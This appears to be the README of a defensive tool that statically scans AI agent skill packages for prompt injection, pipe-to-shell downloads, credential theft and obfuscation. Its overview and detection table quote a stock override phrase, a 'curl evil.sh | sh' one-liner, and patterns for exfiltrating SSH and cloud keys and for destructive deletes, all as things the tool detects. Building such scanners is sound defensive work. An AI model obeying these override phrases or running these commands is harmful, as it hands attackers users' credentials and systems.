# Skill-Audit — Static Safety Scanner for AI Agent Skills

![Skill Audit](https://github.com/skr-electronics-lab/skill-audit/actions/workflows/audit.yml/badge.svg)

> Scan any Claude / Opencode / Cursor agent skill **before** you install it. Detect prompt injection, `curl-pipe-sh` malware, credential theft, obfuscation, and risky supply-chain pulls — in seconds, without executing anything.

If you found this after watching videos about malicious AI skills installing viruses via prompt injection, you are in the right place. This is the pre-install seatbelt for the agent-skill ecosystem.

**Keywords:** AI agent skill security, prompt injection scanner, Claude Code skills audit, Opencode skills safety, Cursor skills malware check, MCP skill vetting, `npx skills add` safety check.

---

## Why this exists

Agent skills are powerful: a `SKILL.md` file plus scripts gets injected straight into your AI agent's context with tool access. That same power is the attack surface:

- Hidden instructions like `ignore previous instructions` steering the agent
- One-liners like `curl evil.sh | sh` buried in `scripts/setup.sh`
- Credential harvesting (`~/.ssh`, `~/.aws`, `CLOUDFLARE_API_TOKEN`, `OPENAI_API_KEY`) exfiltrated to an unknown host
- Obfuscated blobs, typosquatted `pip install` / `npm install -g` packages

Viral clips show the damage but rarely give you a tool. Skill-Audit is that tool: a tiny, readable, stdlib-only scanner you verify in 30 seconds and run before every install.

## Features

- **Read-only by design** — only `read` + `grep`. Never executes target scripts, never loads the skill into agent context.
- **Zero dependencies** — single `scripts/audit.py`, Python 3 stdlib only. Works on Windows, macOS, Linux.
- **Fetch-first workflow** — preview a GitHub skill's `SKILL.md` over HTTPS before cloning.
- **Clear verdicts** — `SAFE` / `REVIEW` / `BLOCK` with file:line evidence.
- **Self-clean** — `audit:allow` escape hatch so documented patterns don't false-positive (the scanner scans itself green).
- **CI-friendly** — exit `0` safe/review, `2` block, `1` usage error.

## Quickstart

```bash
# 1. Try it on a local folder (a skill you downloaded but have NOT installed)
python scripts/audit.py /tmp/untrusted-skill

# 2. Preview a GitHub skill without cloning (SKILL.md only, fast fail)
python scripts/audit.py https://github.com/someone/cool-skill

# 3. Full check: shallow-clone to temp, then scan everything
git clone --depth 1 https://github.com/someone/cool-skill /tmp/untrusted-skill
python scripts/audit.py /tmp/untrusted-skill
# only if SAFE or reviewed REVIEW -> copy to your real skills dir
```

Install as an agent skill (Opencode / Claude Code compatible):

```bash
npx skills add https://github.com/skr-electronics-lab/skill-audit --skill skill-audit
```

Then ask your agent: *"audit this skill before installing: <url-or-path>"*.

## Example output

```text
INFO: SKILL.md:19 [network] Canonical instructions live at [...developers.cloudflare.com...]
WARN: scripts/worker-deploy.sh:40 [supply-chain] npx --yes degit cloudflare/skills/.../worker ...
WARN: scripts/auth-probe.sh:25 [cred-access] token="${CLOUDFLARE_API_TOKEN:-}"
Scanned 29 text files (read-only, nothing executed).
Verdict: REVIEW (23 warnings — confirm each before install)
```

A `REVIEW` is normal for legit Cloudflare / infra skills (they legitimately use API tokens and `curl api.cloudflare.com`). Confirm the hosts are official, the token stays in `$ENV`, and the `degit` source is pinned to a commit — then install.

## What it checks

| Severity | Check | Pattern examples |
|----------|-------|------------------|
| BLOCK | Prompt injection | `ignore previous instructions`, `disregard ... instructions`, `bypass approval`, `disable safe` |
| BLOCK | Exfiltration | `send API key/token to http`, `upload ssh/aws/credential` |
| BLOCK | Pipe-to-shell | `curl ... \| sh`, `wget ... \| sh`, `Invoke-Expression`, `IEX` |
| BLOCK | Destructive | `rm -rf /` (outside `/tmp`), `rm -rf ~`, `del ... C:\Windows`, `format D:` |
| WARN | Credential access | `CLOUDFLARE_API_TOKEN`, `B2_APPLICATION_KEY`, `AWS_SECRET`, `OPENAI_API_KEY`, `~/.ssh`, `~/.aws` |
| WARN | Obfuscation | `base64 -d`, 2000+ char single line, PowerShell `-enc` blob |
| WARN | Supply chain | `npx --yes`, `degit <src>`, `pip install <pkg>`, `npm install -g` |
| INFO | Network | every `https://`, `curl`, `wget`, `fetch(` — review the host list |
| INFO | File writes | `writeFileSync`, `mkdir`, `chmod +x`, `rm -rf` — review the target dir |

Full rule list lives in `scripts/audit.py` (`RULES`). It is ~30 lines. Read it before you trust it — that is the point.

## The safe workflow (recommended)

1. **Fetch first.** `python scripts/audit.py <github-url>` fetches only `SKILL.md` raw. `BLOCK` → stop.
2. **Clone to temp.** `git clone --depth 1 <url>@<sha> /tmp/untrusted-skill`. Nothing runs, nothing enters agent context.
3. **Full scan.** `python scripts/audit.py /tmp/untrusted-skill`. Read every `BLOCK`/`WARN` line.
4. **Install last.** Only `SAFE` or human-reviewed `REVIEW` gets copied to `~/.config/opencode/skills/` (or `.claude/skills/`, `.cursor/skills/`).

Pin audits: record the commit SHA you reviewed. Re-audit on every update — repos move.

## Why you can trust the scanner itself

- No `exec`/`shell` of the target. No `pip/npm install` of target deps. No network calls except the optional single-file GitHub raw fetch.
- `scripts/audit.py` imports only `re`, `sys`, `io`, `urllib.request`, `pathlib`.
- It scans itself `SAFE` (see `audit:allow` markers on documented patterns). Run `python scripts/audit.py .` to confirm.

## Limitations (honest)

Static scanning catches dumb, common malware — not targeted, obfuscated, or multi-stage attacks, and not a repo that turns malicious *after* you audited it. It also flags legit docs (e.g. a skill warning you *not* to read `~/.b2_account_info` still mentions the path → `REVIEW`). That is intentional: `REVIEW` means a human confirms context, not auto-install.

For high-stakes machines: run new skills in a disposable VM/container with empty secrets first, `git diff` after, and keep `bash` on require-approval in your agent.

## Project structure

```text
skill-audit/
  SKILL.md            # agent-facing instructions (Opencode/Claude compatible)
  scripts/audit.py    # the scanner (stdlib only)
  README.md           # this file
  LICENSE            # MIT
```

## Contributing

PRs welcome, especially new red-flag patterns seen in the wild. Keep rules regex-based and documented, keep the script dependency-free, and keep `python scripts/audit.py .` green.

1. Fork → branch → add rule to `RULES` with a `WARN`/`BLOCK` + test case
2. Mark documentation of the pattern itself with `audit:allow` so self-scan stays `SAFE`
3. Open PR with before/after scan output

## FAQ

**Do I need to install a skill to audit it?**
No. That is the whole point. Audit the folder/URL in `/tmp`. Install only after `SAFE`/reviewed.

**It says REVIEW on a legit skill. Is it broken?**
No. Legit infra skills touch tokens and networks. Read the 5–10 `WARN` lines, confirm hosts are official (`api.cloudflare.com`, `github.com/cloudflare/...`) and tokens stay in env vars, then proceed.

**Windows supported?**
Yes. The scanner forces UTF-8 stdout so `→` etc. don't crash `cp1252` consoles.

**Does it replace common sense?**
No. It raises the bar from "blind install from a reel" to "5-second evidence-based decision". Unknown author + `BLOCK` + obfuscation = walk away.

## License

MIT — see `LICENSE`. Created after community reports of malicious agent skills spread via short-form video. Share the install line wherever those videos circulate.
